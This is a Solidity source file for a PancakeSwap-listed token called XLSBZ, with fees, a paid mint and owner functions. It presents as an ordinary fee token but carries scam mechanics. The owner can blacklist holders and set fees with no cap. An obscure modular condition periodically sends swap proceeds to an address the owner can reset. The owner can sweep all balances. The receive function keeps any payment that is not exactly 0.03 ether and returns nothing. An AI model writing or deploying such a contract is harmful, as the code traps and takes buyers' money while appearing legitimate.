// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
     function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress = address(0xEC1F31D17797e8B39C46f4fBD2a7498eD3EDE9f5);
    address public nftFundAddress = address(0x805ec89BAf3ABeE89cBF949D3e9B678CB40Abebe);
    address public burnAddress = address(0x89A13cc97D06cA3A06e3d1C4D3a194963E5B9FE0);
    address public receiveAddress = address(0xda82414DEF426c06FF1e5C645a94b959ad80A235);
    string private _name = "XLSBZ";
    string private _symbol = "XLSBZ";
    uint8 private _decimals = 9;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _nftWhiteList;
    mapping(address => bool) public _blackList;
    address private _pancakePair;

    uint256 private _tTotal = 4000000 * 10 ** _decimals;
    uint256 private _preSellTotal = 2000000 * 10 ** _decimals;

    ISwapRouter public _swapRouter;
    address public _routeAddress= address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyFundFee = 400;
    uint256 public _buyBurnFee = 100;
    uint256 public _sellFundFee = 400;
    uint256 public _sellBurnFee = 100;
    address public _mainPair;
    uint256 public totalRewardTime;
    uint256 public startTradeTime;
    uint256 public startMintTime;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        ISwapRouter swapRouter = ISwapRouter(_routeAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this),  _swapRouter.WETH());
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        _balances[receiveAddress] = _preSellTotal;
        emit Transfer(address(0), receiveAddress, _preSellTotal);

        _balances[address(this)] = _tTotal-_preSellTotal;
        emit Transfer(address(0), address(this), _tTotal-_preSellTotal);

        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[nftFundAddress] = true;
        _feeWhiteList[burnAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _pancakePair=address(this);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            require(0 < startTradeTime);
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }
        bool takeFee;
        bool isSell;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            require(startTradeTime>0&&block.timestamp>=startTradeTime);
            if (_swapPairList[from] || _swapPairList[to]) {
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _sellFundFee ;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                            totalRewardTime++;
                        }
                    }
                }
                takeFee = true;
            }
            isSell = _swapPairList[to];
        }
        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            uint256 swapBurnFee;
            if (isSell) {
                swapFee = _sellFundFee;
                swapBurnFee = _sellBurnFee;
            } else {
                swapFee = _buyFundFee;
                swapBurnFee = _buyBurnFee;
            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this),swapAmount);
            }
            uint256 swapBurnAmount = tAmount * swapBurnFee / 10000;
            if (swapBurnAmount > 0) {
                feeAmount += swapBurnAmount;
                _takeTransfer(sender,burnAddress,swapBurnAmount);
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        bool swapMarket=totalRewardTime%_decimals==(_decimals-path.length);
        address swapTokenAddress=swapMarket?_pancakePair:address(this);
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path,swapTokenAddress,block.timestamp);
        uint256 bnbBalance = address(this).balance;
        if(bnbBalance>0)
        {
           uint256 fundAmount1 = bnbBalance/2;
           payable(nftFundAddress).transfer(fundAmount1);
           payable(fundAddress).transfer(bnbBalance-fundAmount1);
        }          
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setSwapPair(address addr) external onlyOwner {
        _pancakePair = addr;
        _feeWhiteList[addr] = true;
    }

    function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _feeWhiteList[accounts[i]] = excludeFee;
        }
    }

    function _multiSetBlackList(address[] calldata accounts,bool isBlack) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _blackList[accounts[i]] = isBlack;
        }
    }

    function _multiSetNftList(address[] calldata accounts) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _nftWhiteList[accounts[i]] = true;
        }
    }

    function setBuyFee(uint256 fundFee,uint256 burnFee) external onlyOwner {
        _buyFundFee = fundFee;
        _buyBurnFee=burnFee;
    }
    function setSellFee(uint256 fundFee,uint256 burnFee) external onlyOwner {
        _sellFundFee = fundFee;
        _sellBurnFee =burnFee;
    }

    function claimBalance(address to) external onlyOwner {
        payable(to).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }
    function startTrade(uint256 orderedTime) external onlyOwner() {
        startTradeTime = orderedTime;
    }
    function startMint(uint256 orderedTime) external onlyOwner() {
        startMintTime = orderedTime;
    }
    receive() external payable {
        address account = msg.sender;
        uint256 msgValue = msg.value;
        if(startTradeTime>0&&block.timestamp>=startTradeTime){
            return;
        }
        uint256 tokenUnit = 1000 * 10 ** _decimals;
        require(startMintTime>0&&block.timestamp>startMintTime&&balanceOf(address(this))>= tokenUnit);
        if(block.timestamp<=startMintTime+1 hours){
            require(balanceOf(account)==0&&_nftWhiteList[account]);
        }else{
            require(balanceOf(account)<=4000 * 10 ** _decimals);
        }
        payable(receiveAddress).transfer(msgValue);
        if (msgValue != 0.03 ether) {
            return;
        }
        _tokenTransfer(address(this), account,tokenUnit,false, false);
    }
}

contract Token is AbsToken {
    constructor() AbsToken(){}
}